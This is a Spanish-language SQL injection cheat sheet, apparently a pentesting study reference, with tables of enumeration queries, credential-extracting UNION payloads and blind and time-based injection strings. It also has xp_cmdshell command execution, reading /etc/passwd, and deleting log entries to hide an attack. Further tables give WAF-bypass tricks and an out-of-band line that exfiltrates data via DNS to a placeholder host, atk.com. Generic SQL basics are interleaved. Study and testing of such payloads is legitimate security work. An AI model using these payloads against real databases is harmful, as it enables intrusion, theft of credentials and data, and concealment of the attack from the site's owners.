# Enumeración
| **Acción**          | **MySQL / MariaDB**                                                       | **PostgreSQL**                                                            | **SQL Server (MSSQL)**                                                                |
| ------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| **Versión**         | `SELECT @@version`                                                        | `SELECT version()`                                                        | `SELECT @@version`                                                                    |
| **Usuario Actual**  | `SELECT user()`                                                           | `SELECT current_user`                                                     | `SELECT user_name()`                                                                  |
| **Base de Datos**   | `SELECT database()`                                                       | `SELECT current_database()`                                               | `SELECT db_name()`                                                                    |
| **Listar Tablas**   | `SELECT table_name FROM information_schema.tables`                        | `\dt` o `SELECT tablename FROM pg_catalog.pg_tables`                      | `SELECT name FROM sysobjects WHERE xtype='U'`                                         |
| **Listar Columnas** | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'X')` |

# Extracción 
| **Técnica / Parámetro** | **Función**                                                      | **Ejemplo de Sintaxis**                                    |
| ----------------------- | ---------------------------------------------------------------- | ---------------------------------------------------------- |
| `UNION SELECT`          | Combina resultados de la consulta original con datos robados.    | `' UNION SELECT null, user, password FROM users --`        |
| `GROUP_CONCAT`          | Concatena múltiples filas en una sola cadena (útil en MySQL).    | `SELECT GROUP_CONCAT(username) FROM users`                 |
| `SUBSTRING`             | Extrae partes de un dato (ideal para SQLi ciega o _Blind_).      | `SELECT SUBSTRING(password,1,1) FROM users WHERE id=1`     |
| `LIMIT / OFFSET`        | Desplaza los resultados para extraer registros uno a uno.        | `SELECT email FROM users LIMIT 1 OFFSET 5`                 |
| `INTO OUTFILE`          | Escribe el resultado de una consulta en un archivo del servidor. | `SELECT * FROM users INTO OUTFILE '/var/www/html/out.txt'` |

# PostExp y evasión
|**Parámetro / Comando**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`xp_cmdshell`|Ejecuta comandos de SO (Exclusivo MSSQL, requiere privilegios).|`EXEC sp_configure 'xp_cmdshell', 1; EXEC xp_cmdshell 'whoami';`|
|`LOAD_FILE`|Lee el contenido de archivos locales del servidor.|`SELECT LOAD_FILE('/etc/passwd')`|
|`CHAR()`|Evade filtros de comillas usando códigos ASCII.|`SELECT * FROM users WHERE name = CHAR(65,68,77,73,78)`|
|`SLEEP()` / `pg_sleep()`|Introduce retardos para confirmar vulnerabilidades _Time-based_.|`SELECT IF(1=1, SLEEP(5), 0)`|
|`--` , `#` , `/*`|Comentarios para anular el resto de la consulta original.|`' OR 1=1 -- -`|

# Borrado 
| **Acción** | **Función**                                                 | **Ejemplo de Sintaxis**                          |
| ---------- | ----------------------------------------------------------- | ------------------------------------------------ |
| `DELETE`   | Borra registros específicos (deja rastro en logs).          | `DELETE FROM logs WHERE user_id = 'atacker_ip'`  |
| `TRUNCATE` | Borra todos los registros de una tabla rápidamente.         | `TRUNCATE TABLE logs`                            |
| `DROP`     | Elimina la estructura completa de la tabla o base de datos. | `DROP TABLE users`                               |
| `UPDATE`   | Modifica datos existentes (ej. cambiar una contraseña).     | `UPDATE users SET pass='123' WHERE user='admin'` |

# Fundamentos (DML / DDL)

## DML — Manipulación de datos

| Sentencia | Función | Ejemplo |
|-----------|---------|---------|
| `SELECT` | Consulta filas. | `SELECT id, email FROM users WHERE active=1` |
| `INSERT` | Inserta filas. | `INSERT INTO users (user,pass) VALUES ('a','b')` |
| `UPDATE` | Modifica filas existentes. | `UPDATE users SET active=0 WHERE id=5` |
| `DELETE` | Borra filas. | `DELETE FROM users WHERE id=5` |
| `WHERE` | Filtra. | `WHERE edad BETWEEN 18 AND 30` |
| `ORDER BY` | Ordena. | `ORDER BY fecha DESC` |
| `GROUP BY` / `HAVING` | Agrupa y filtra agregados. | `GROUP BY pais HAVING COUNT(*) > 10` |
| `LIMIT` / `OFFSET` | Pagina resultados. | `LIMIT 20 OFFSET 40` |

## DDL — Definición de estructura

| Sentencia | Función | Ejemplo |
|-----------|---------|---------|
| `CREATE TABLE` | Crea tabla. | `CREATE TABLE t (id INT PRIMARY KEY, n VARCHAR(50))` |
| `ALTER TABLE` | Modifica estructura. | `ALTER TABLE t ADD COLUMN edad INT` |
| `DROP TABLE` | Elimina tabla. | `DROP TABLE t` |
| `CREATE INDEX` | Acelera consultas. | `CREATE INDEX idx_n ON t(n)` |

# JOINs

| Tipo | Devuelve |
|------|----------|
| `INNER JOIN` | Solo filas con coincidencia en ambas tablas. |
| `LEFT JOIN` | Todas las de la izquierda + coincidencias (NULL si no hay). |
| `RIGHT JOIN` | Todas las de la derecha + coincidencias. |
| `FULL OUTER JOIN` | Unión de ambas (no en MySQL; emular con `UNION`). |
| `CROSS JOIN` | Producto cartesiano. |

```sql
SELECT u.email, o.total
FROM users u
INNER JOIN orders o ON o.user_id = u.id
WHERE o.total > 100;
```

# Funciones de agregación

| Función | Uso |
|---------|-----|
| `COUNT(*)` | Número de filas. |
| `SUM(col)` / `AVG(col)` | Suma / promedio. |
| `MIN(col)` / `MAX(col)` | Mínimo / máximo. |
| `GROUP_CONCAT` (MySQL) / `STRING_AGG` (PG/MSSQL) | Concatena valores de un grupo. |

# SQLi — Identificación de columnas

| Técnica | Función | Ejemplo |
|---------|---------|---------|
| `ORDER BY n` | Incrementar `n` hasta error → nº de columnas. | `' ORDER BY 5 -- -` |
| `UNION SELECT NULL,...` | Ajustar NULLs hasta no error → nº y tipos. | `' UNION SELECT NULL,NULL -- -` |
| Columna reflejada | Sustituir un NULL por cadena para hallar la visible. | `' UNION SELECT 'a',NULL -- -` |
| Concatenar para una sola columna | Cuando solo hay 1 columna visible. | `' UNION SELECT user\|\|':'\|\|pass FROM users -- -` |

# SQLi a ciegas (Blind)

| Tipo | Mecanismo | Ejemplo |
|------|-----------|---------|
| Boolean-based | Inferir bit a bit por la diferencia de respuesta. | `' AND SUBSTRING(pass,1,1)='a' -- -` |
| Time-based | Retardo condicional confirma la inyección. | `' AND IF(1=1,SLEEP(5),0) -- -` (MySQL) |
| Time-based PG | `' AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- -` |
| Time-based MSSQL | `'; IF (1=1) WAITFOR DELAY '0:0:5' -- -` |
| Error-based | Forzar error que filtra datos. | `' AND extractvalue(1,concat(0x7e,version())) -- -` (MySQL) |
| Out-of-band (OAST) | Exfiltrar vía DNS/HTTP. | `'; exec master..xp_dirtree '//'+@@version+'.atk.com/a' -- -` |

# Concatenación por SGBD

| SGBD | Operador / función |
|------|--------------------|
| MySQL | `CONCAT(a,b)` (el `\|\|` solo si `PIPES_AS_CONCAT`) |
| PostgreSQL | `a \|\| b` o `CONCAT(a,b)` |
| MSSQL | `a + b` o `CONCAT(a,b)` |
| Oracle | `a \|\| b` |

# Bypass de WAF/filtros

| Técnica | Ejemplo |
|---------|---------|
| Comentarios inline | `UN/**/ION SE/**/LECT` |
| Cambio de mayúsculas | `UnIoN sElEcT` |
| Codificación | URL-encode (`%27`), doble URL-encode, hex (`0x61646d696e`) |
| Espacios alternativos | `/**/`, `%09`, `%0a`, `+`, paréntesis |
| Keywords anidados | `SELSELECTECT` (si el WAF borra una vez) |
| `CHAR()` para strings | `WHERE name=CHAR(97,100,109,105,110)` |
| Operadores lógicos | `&&` por `AND`, `\|\|` por `OR` |

# Recursos
### [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
### [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
### [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)